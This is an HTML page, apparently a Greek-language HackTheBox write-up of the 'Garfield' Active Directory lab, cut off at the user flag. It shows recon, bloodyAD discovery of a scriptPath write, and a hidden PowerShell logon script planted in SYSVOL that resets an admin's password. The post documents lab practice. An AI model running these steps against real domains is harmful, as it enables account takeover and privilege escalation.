@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html lang="el">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: Garfield — S. Markakis</title>
+<meta name="description" content="Ο υπολογιστής HackTheBox Garfield (Δύσκολος, Windows AD) πάρθηκε root από macOS: ένα μοναδικό write επιπέδου-attribute στο scriptPath που το BloodHound δεν μπορεί να δει, κρυμμένο με bloodyAD, καταλαμβάνει ένα εγγράψιμο-NTFS logon script SYSVOL για να κάνει reset το password ενός admin· τα ForceChangePassword και AddSelf ανεβαίνουν σε RODC Administrators· RBCD + ένα pivot chisel αποδίδουν SYSTEM στον read-only DC· και το κλειδί του krbtgt_8245, αφού ξαναγράψει το Password Replication Policy, πλαστογραφεί ένα RODC Golden Ticket (Rubeus 2.3.3) για Domain Admin στον πρωτεύοντα DC.">
+<meta property="og:title" content="HTB: Garfield — S. Markakis">
+<meta property="og:description" content="HTB Garfield — write επιπέδου-attribute στο scriptPath (BloodHound-blind) → SYSVOL logon-script hijack → ForceChangePassword/AddSelf → RODC Administrators → RBCD + chisel → SYSTEM στον RODC → krbtgt_8245 + PRP rewrite → RODC Golden Ticket (Rubeus 2.3.3) → Domain Admin. Όλα από macOS.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-garfield-el.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-garfield.png">
+<meta property="og:locale" content="el_GR">
+<meta property="og:locale:alternate" content="en_US">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-garfield.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-garfield-el.html">
+<link rel="alternate" hreflang="en" href="https://s-markakis.github.io/writeups/htb-garfield.html">
+<link rel="alternate" hreflang="el" href="https://s-markakis.github.io/writeups/htb-garfield-el.html">
+<link rel="alternate" hreflang="x-default" href="https://s-markakis.github.io/writeups/htb-garfield.html">
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-lin  { background: #d8d0c0; color: #4a3a20; }
+  .tag-win  { background: #c0d0e0; color: #1e3a5a; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.74rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p { color: var(--text); margin-bottom: 1rem; }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  .screenshot {
+    max-width: 100%;
+    height: auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.6rem auto;
+    display: block;
+  }
+  picture { display: block; }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<style>
+  .htb-cta{display:flex;gap:.6rem;flex-wrap:wrap;margin:1.5rem 0}
+  .htb-cta.top{margin-top:.4rem}
+  .htb-cta a{flex:1 1 220px;display:flex;align-items:center;gap:.75rem;padding:.75rem .9rem;background:var(--bg-code);border:1px solid var(--border);border-radius:8px;text-decoration:none;color:var(--text-dark);font-family:'Barlow',sans-serif;transition:transform .15s,border-color .15s,background .15s}
+  .htb-cta a:hover{transform:translateY(-2px);border-color:var(--text-dark);background:var(--bg-term)}
+  .htb-cta svg{width:20px;height:20px;flex:none;stroke:var(--text-dark);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .htb-cta .l-t{display:block;font-family:'Barlow Condensed',sans-serif;font-weight:600;font-size:1.02rem;letter-spacing:.01em;line-height:1.15;color:var(--text-dark)}
+  .htb-cta .l-s{display:block;font-size:.72rem;color:var(--text-mid);line-height:1.25}
+  .htb-cta .l-x{margin-left:auto;color:var(--text-mid);font-size:.95rem}
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Garfield",
+  "description": "Ο υπολογιστής HackTheBox Garfield (Δύσκολος, Windows AD) πάρθηκε root από macOS: ένα μοναδικό write επιπέδου-attribute στο scriptPath που το BloodHound δεν μπορεί να δει, κρυμμένο με bloodyAD, καταλαμβάνει ένα εγγράψιμο-NTFS logon script SYSVOL για να κάνει reset το password ενός admin· τα ForceChangePassword και AddSelf ανεβαίνουν σε RODC Administrators· RBCD + ένα pivot chisel αποδίδουν SYSTEM στον read-only DC· και το κλειδί του krbtgt_8245, αφού ξαναγράψει το Password Replication Policy, πλαστογραφεί ένα RODC Golden Ticket (Rubeus 2.3.3) για Domain Admin στον πρωτεύοντα DC.",
+  "datePublished": "2026-08-04",
+  "dateModified": "2026-08-04",
+  "inLanguage": "el",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-garfield-el.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-garfield.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-garfield"
+  },
+  "timeRequired": "PT10M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Πίσω στο blog</a>
+
+<div class="wrapper">
+
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">← Πίσω στα posts</a>
+  <p style="font-size:.8rem;letter-spacing:.04em;color:var(--text-mid);margin-bottom:1.2rem;"><a href="htb-garfield.html" style="font-weight:600;">English</a> &nbsp;·&nbsp; <strong style="color:var(--text-dark);">Ελληνικά</strong></p>
+
+  <div class="post-header">
+    <h1>HTB: Garfield</h1>
+    <div class="post-meta">
+      <span class="date">13 Σεπτεμβρίου 2026</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-win">Windows / AD</span>
+      <span class="tag">RODC Golden Ticket</span>
+      <span class="tag">Δυσκολο</span>
+      <span>&nbsp;15 λεπτά αναγνωσης</span>
+    </div>
+  </div>
+
+  <div class="htb-cta top">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">Το προφίλ μου στο HTB &amp; περισσότερα boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Εργαλεία security &amp; automation ανοιχτού κώδικα</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+
+  <hr class="divider">
+
+  <div class="overview">
+    Το Garfield είναι ένα Δύσκολο box Windows χτισμένο γύρω από έναν πρωτεύοντα Domain Controller (DC01) και έναν <strong>Read-Only Domain Controller</strong> (RODC01) σε ένα κρυμμένο εσωτερικό segment. Ξεκινάς με έναν απλό χρήστη domain, και το BloodHound λέει κατηγορηματικά ότι εκείνος ο χρήστης δεν ελέγχει <em>τίποτα</em> — κανένα μονοπάτι προς Domain Admin. Το μονοπάτι είναι πραγματικό· το εργαλείο απλά δεν μπορεί να το δει. Ένα μοναδικό ACE <strong>επιπέδου-attribute</strong> δίνει write σε μία property — το <code>scriptPath</code> — σε δύο privileged χρήστες, που το BloodHound (μόνο επιπέδου-αντικειμένου) ποτέ δεν αναδεικνύει. Εκείνο το ένα write καταλαμβάνει ένα NTFS-εγγράψιμο logon script SYSVOL για να πυροδοτήσει ένα reset <strong>ForceChangePassword</strong>, που αλυσιδώνεται μέσω ενός <strong>AddSelf</strong> μέσα σε <strong>RODC Administrators</strong>. Από εκεί είναι <strong>RBCD</strong> + ένα pivot σε SYSTEM στον read-only DC, κάνοντας dump το αφιερωμένο κλειδί <code>krbtgt_8245</code> του. Το "read-only" αποδεικνύεται ψέμα: αφού ξαναγράψει το Password Replication Policy του RODC, εκείνο το κλειδί πλαστογραφεί ένα <strong>RODC Golden Ticket</strong> (Rubeus 2.3.3) που ο εγγράψιμος DC δέχεται ευχαρίστως — Domain Admin. Όλο αυτό οδηγείται από macOS, που μετέτρεψε την τελευταία φάση σε έναν δεύτερο, πιο ήσυχο καβγά ενάντια στο δικό μου toolchain.
+  </div>
+
+  <div class="chain">
+    <span class="chain-node">domain user</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">scriptPath write (BloodHound-blind)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">SYSVOL logon-script → ForceChangePassword</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">AddSelf → RODC Administrators</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">RBCD + chisel → SYSTEM on RODC</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">krbtgt_8245 + PRP rewrite</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">RODC Golden Ticket → DA</span>
+  </div>
+
+  <!-- ══ RECON ══ -->
+  <h2>Αναγνώριση</h2>
+
+  <p>Μια πλήρης σάρωση επιστρέφει το συνηθισμένο περίγραμμα Domain Controller — DNS, Kerberos, LDAP, SMB, RPC, WinRM. Το πιστοποιητικό RDP και το banner SMB ονομάζουν τον host και το domain.</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">nmap — the DC fingerprint</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nmap -Pn -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 &lt;DC&gt;</span>
+<span class="po">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server </span><span class="pco"># cert CN = DC01.garfield.htb</span><span class="po">
+5985/tcp open  http          Microsoft HTTPAPI 2.0   </span><span class="pco"># WinRM</span><span class="po">
+| smb2-security-mode: Message signing enabled and required</span><span class="pco">  # no SMB relay</span></div>
+  </div>
+
+  <p>Δύο γεγονότα να καταγράψω: το <strong>SMB signing απαιτείται</strong> (σκοτώνει το SMB relay), και το box είναι ένας DC Windows Server 2019 ονομασμένος <code>DC01.garfield.htb</code>. Το ρολόι είναι επίσης ~8 ώρες μπροστά μου — άσχετο τώρα, ένας επαναλαμβανόμενος πονοκέφαλος αργότερα για κάθε βήμα Kerberos από macOS.</p>
+
+  <!-- ══ ENUM ══ -->
+  <h2>Καταμέτρηση — μια έγκυρη κάρτα, μηδέν πόρτες</h2>
+
+  <p>Αυτό είναι ένα box assume-breach: σου δίνουν <code>j.arbuckle : &lt;assigned-pass&gt;</code>. Τα credentials δουλεύουν, αλλά ο λογαριασμός δεν είναι τίποτα ιδιαίτερο — χωρίς <code>Pwn3d!</code>, στάνταρ shares, read-only στο SYSVOL/NETLOGON.</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">confirm creds + enumerate</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nxc smb &lt;DC&gt; -u j.arbuckle -p '&lt;assigned-pass&gt;'</span>
+<span class="pg">SMB  &lt;DC&gt;  445  DC01  [+] garfield.htb\j.arbuckle:&lt;assigned-pass&gt;</span>
+<span class="pd">$ </span><span class="pc">nxc smb &lt;DC&gt; -u j.arbuckle -p '...' --users | awk '{print $NF}'</span>
+<span class="po">Administrator  Guest  krbtgt  </span><span class="py">krbtgt_8245</span><span class="po">  j.arbuckle  l.wilson  l.wilson_adm</span></div>
+  </div>
+
+  <p>Η λίστα χρηστών λέει μια ιστορία. Οι <code>l.wilson</code> και <code>l.wilson_adm</code> είναι κλασικό admin tiering — ένα άτομο και το privileged δίδυμό του. Και το <code>krbtgt_8245</code> δεν είναι καθόλου πρόσωπο: είναι ο αφιερωμένος λογαριασμός κλειδιού KDC για έναν <strong>Read-Only Domain Controller</strong>. Υπάρχει ένας δεύτερος DC κρυμμένος κάπου, με το δικό του υλικό κλειδιού Kerberos. Κατάγραψε και αυτό.</p>
+
+  <p>Το SYSVOL, read-only, κρατά ένα μη-default artifact — ένα logon script στον φάκελο <code>scripts</code>:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">SYSVOL — a script in plain sight</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">smbclient //&lt;DC&gt;/SYSVOL -U 'garfield.htb\j.arbuckle%...' -c 'ls garfield.htb\scripts'</span>
+<span class="po">  printerDetect.bat   A   217   ...</span>
+<span class="pd">$ </span><span class="pc">cat printerDetect.bat</span>
+<span class="po">@echo off
+wmic printer get Name,DeviceID,PortName,DriverName,Shared,Status</span></div>
+  </div>
+
+  <p>Αθώο από μόνο του — ένα απόθεμα εκτυπωτή. Αυτό που έχει σημασία δεν είναι το περιεχόμενο του script· είναι <em>ποιος μπορεί να αλλάξει σε τι δείχνει</em>. Κράτα αυτή τη σκέψη.</p>
+
+  <!-- ══ BLOODHOUND BLIND ══ -->
+  <h2>Το εργαλείο που είπε ψέματα με παράλειψη</h2>
+
+  <p>Το BloodHound είναι το αντανακλαστικό εδώ, οπότε συνέλεξα και έκανα import. Ο κόμβος <code>j.arbuckle</code> ήταν ένα φάντασμα με έγκυρη κάρτα: μέλος των <code>Users</code>, <code>Domain Users</code>, <code>IT Support</code> — και <strong>Outbound Object Control: 0</strong>. Χωρίς GenericAll, χωρίς GenericWrite, χωρίς ForceChangePassword. Το "Shortest path to Domain Admins" επέστρεψε <em>Path not found</em>.</p>
+
+  <p>Έκαψα πραγματικό χρόνο στα κλασικά πριν αμφισβητήσω τον χάρτη:</p>
+  <ul>
+    <li><strong>AS-REP roasting</strong> — κάθε λογαριασμός επέβαλε pre-auth. Τίποτα.</li>
+    <li><strong>Kerberoasting</strong> — το <code>GetUserSPNs</code> επέστρεψε <em>No entries found</em>. Ούτε ένα SPN στο domain.</li>
+    <li><strong>PetitPotam / coercion → LDAP relay</strong> — η coercion πυροδοτήθηκε και ο DC01 κάλεσε πίσω, αλλά ο client ζήτησε signing και το LDAP relay πέθανε κατά την άφιξη. Το SMB signing απαιτούνταν, και το LDAP signing επιβαλλόταν επίσης.</li>
+    <li><strong>Password spraying</strong> — το μόνο hit ήταν ο λογαριασμός που ήδη κατείχα.</li>
+  </ul>
+
+  <p>Κάθε στάνταρ τεχνική συμφωνούσε: αυτός ο χρήστης είναι ανίσχυρος. Αλλά ένα Δύσκολο box δεν σου δίνει credentials και δεν αφήνει κανέναν δρόμο. Η σωστή ερώτηση δεν ήταν "τι άλλο μπορώ να δοκιμάσω;" — ήταν "<strong>τι δεν μου δείχνει το BloodHound;</strong>"</p>
+
+  <p>Το BloodHound (Legacy και CE) κάνει καταμέτρηση ACLs στο επίπεδο <em>αντικειμένου</em> — πιάνει GenericAll, GenericWrite, WriteDACL, WriteOwner. Αλλά τα δικαιώματα AD είναι πολύ πιο κοκκώδη: μπορείς να δώσεις write σε ένα <em>μοναδικό attribute</em>, και εκτός αν ένα εργαλείο κάνει query DACLs επιπέδου-attribute, εκείνο το δικαίωμα είναι αόρατο.</p>
+
+  <!-- ══ BLOODYAD ══ -->
+  <h2>bloodyAD — διαβάζοντας τα ψιλά γράμματα</h2>
+
+  <p>Το <code>bloodyAD</code> ελέγχει δικαιώματα write ανά-attribute — ακριβώς τα ψιλά γράμματα που παραλείπει το BloodHound. Το <code>get writable</code> του εξερράγη στο terminal με τον συνηθισμένο θόρυβο self-service (τηλέφωνα, ταχυδρομικές διευθύνσεις, attributes cloud-extension που κάθε χρήστης μπορεί να επεξεργαστεί στον εαυτό του). Θαμμένο μέσα, σε αντικείμενα που δεν ήταν δικά μου να αγγίξω, ένα attribute ξεχώρισε:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">the edge BloodHound couldn't see</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">bloodyAD --host &lt;DC&gt; -d garfield.htb -u j.arbuckle -p '...' get writable --detail</span>
+<span class="po">distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
+</span><span class="pg">scriptPath: WRITE</span><span class="po">
+
+distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
+</span><span class="pg">scriptPath: WRITE</span></div>
+  </div>
+
+  <p>Ο <code>j.arbuckle</code> μπορεί να γράψει το attribute <code>scriptPath</code> και στον <code>l.wilson</code> <em>και</em> στον <code>l.wilson_adm</code>. Το <code>scriptPath</code> είναι το logon script που τρέχει κάθε φορά που εκείνος ο χρήστης κάνει sign in. Όχι GenericWrite, όχι ένα password reset — ένα attribute. Και ήταν αρκετό για να ξεφτίσει το domain.</p>
+
+  <!-- ══ FOOTHOLD ══ -->
+  <h2>Οπλοποιώντας το SYSVOL — το logon script</h2>
+
+  <p>Το σχέδιο: δείξε το <code>scriptPath</code> του <code>l.wilson</code> σε ένα script που ελέγχω, περίμενε το box να προσομοιώσει το logon εκείνου του χρήστη, και τρέξε κώδικα σαν <code>l.wilson</code>. Δύο πράγματα έπρεπε να είναι αληθινά. Πρώτο, χρειαζόμουν να <em>γράψω</em> ένα script στον φάκελο <code>scripts</code> του netlogon — και το <code>--shares</code> έλεγε READ. Αλλά τα δικαιώματα επιπέδου-share και επιπέδου-NTFS είναι διαφορετικά πράγματα, και δεν δοκίμασα ποτέ το ACL του NTFS. Ήταν εγγράψιμο όλη την ώρα:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">SYSVOL scripts is NTFS-writable</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">smbclient //&lt;DC&gt;/SYSVOL -U 'garfield.htb\j.arbuckle%...' -c 'cd garfield.htb\scripts; put x.bat'</span>
+<span class="pg">putting file x.bat as \garfield.htb\scripts\x.bat</span></div>
+  </div>
+
+  <p>Δεύτερο — και αυτό είναι το κομμάτι που μου αρέσει — δεν χρειάστηκα ποτέ ένα reverse shell. Ένα ζωντανό callback είναι το πιο θορυβώδες πράγμα που μπορείς να κάνεις, και είναι περιττό εδώ. Το logon script τρέχει <em>σαν <code>l.wilson</code></em>, και ο <code>l.wilson</code> κρατά <strong>ForceChangePassword</strong> πάνω στον <code>l.wilson_adm</code> (μια ακμή που εμφανίζεται μόνο αφού λειτουργείς σαν εκείνον). Οπότε το ίδιο το script κάνει κατάχρηση εκείνου του δικαιώματος: κάνει reset το password του admin διδύμου σε κάτι που ξέρω, in-process, request/response, τίποτα να πιάσω.</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">x.bat — runs as l.wilson at logon</span></div>
+    <div class="term-body"><span class="po">@echo off
+powershell -nop -w hidden -c "$p=ConvertTo-SecureString '&lt;NewAdminPass&gt;' -AsPlainText -Force; `
+  Set-ADAccountPassword -Identity l.wilson_adm -Reset -NewPassword $p"</span></div>
+  </div>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">set scriptPath, wait for the logon</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">bloodyAD --host &lt;DC&gt; -d garfield.htb -u j.arbuckle -p '...' set object l.wilson scriptPath -v 'x.bat'</span>
+<span class="pg">[+] l.wilson's scriptPath has been updated</span>
+<span class="pd">$ </span><span class="pc"># ~30s later — the reset landed</span>
+<span class="pd">$ </span><span class="pc">nxc smb &lt;DC&gt; -u l.wilson_adm -p '&lt;NewAdminPass&gt;'</span>
+<span class="pg">SMB  &lt;DC&gt;  445  DC01  [+] garfield.htb\l.wilson_adm:&lt;NewAdminPass&gt;</span></div>
+  </div>
+
+  <p>Από ένα μοναδικό attribute write σε έναν ελεγχόμενο privileged λογαριασμό. Το WinRM σαν <code>l.wilson_adm</code> δίνει το user flag:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">user.txt</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">evil-winrm -i &lt;DC&gt; -u l.wilson_adm -p '&lt;NewAdminPass&gt;'</span>
+<span class="pd">*Evil-WinRM*</span><span class="pc"> type C:\Users\l.wilson_adm\Desktop\user.txt</span>
